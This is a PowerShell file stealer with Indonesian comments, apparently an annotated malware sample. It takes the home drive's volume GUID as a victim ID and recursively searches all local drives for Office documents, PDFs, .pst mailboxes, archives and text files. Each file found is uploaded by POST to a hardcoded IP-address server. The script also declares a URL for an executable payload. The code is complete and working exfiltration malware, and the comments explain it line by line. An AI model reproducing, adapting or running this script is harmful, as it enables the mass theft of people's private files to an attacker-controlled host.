# URL untuk mengunduh file (tidak digunakan dalam kode ini, tetapi dideklarasikan)
$url_dwn1 = "http://eumr.site/load74h74838.exe"

# URL endpoint untuk mengunggah file
$url = "http://185.244.41.109:8080/upld/"

# Mengambil semua drive logis yang memiliki tipe drive '3' (drive lokal)
$dsks = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3"

# Variabel untuk menyimpan drive utama (home drive)
$reme = 0

# Menentukan drive utama (home drive) pengguna saat ini
$homeDrive = [System.Environment]::GetEnvironmentVariable("HOMEDRIVE")
foreach ($dsk in $dsks) {
    if ($dsk.DeviceID -eq $homeDrive) {
        $reme = $dsk  # Menyimpan informasi drive utama ke dalam $reme
        break
    }
}

# Mengambil serial number dari home drive menggunakan GUID
$suuid = (Get-Volume -DriveLetter $reme.DeviceID[0]).ObjectId.Guid

# Mendefinisikan tipe file yang akan dicari di dalam drive
$fileTypes = @(
    "*.doc", "*.docx", "*.pdf", "*.ppt", "*.pptx", "*.dot", 
    "*.xls", "*.xlsx", "*.csv", "*.rtf", "*.mdb", "*.accdb", 
    "*.pot", "*.pps", "*.pst", "*.ppa", "*.rar", "*.zip", 
    "*.tar", "*.7z", "*.txt"
)

# Melakukan pencarian file sesuai dengan tipe yang didefinisikan
# Lalu mengunggah file tersebut ke server yang telah dideklarasikan di $url
foreach ($dsk in $dsks) {
    $driveLetter = $dsk.DeviceID  # Mendapatkan huruf drive (misalnya: C:\, D:\)
    foreach ($fileType in $fileTypes) {
        # Mencari file dengan ekstensi tertentu di seluruh direktori drive (rekursif)
        $files = Get-ChildItem -Path "$driveLetter\" -Recurse -Filter $fileType -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $fileName = $file.FullName  # Mendapatkan path lengkap file
            # Mengonversi nama file menjadi representasi hexadecimal untuk dikirim sebagai header
            $fileNameHex = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($fileName)) -replace '-', ''
            # Menentukan endpoint API dengan serial number drive sebagai parameter
            $uri = "$url$suuid"
            # Membaca isi file dalam bentuk byte
            $content = [IO.File]::ReadAllBytes($file.FullName)
            # Mengunggah file ke server dengan menggunakan metode POST
            Invoke-RestMethod -Uri $uri -Method Post -InFile $fileName -Headers @{"File-Name" = $fileNameHex}
        }
    }
}
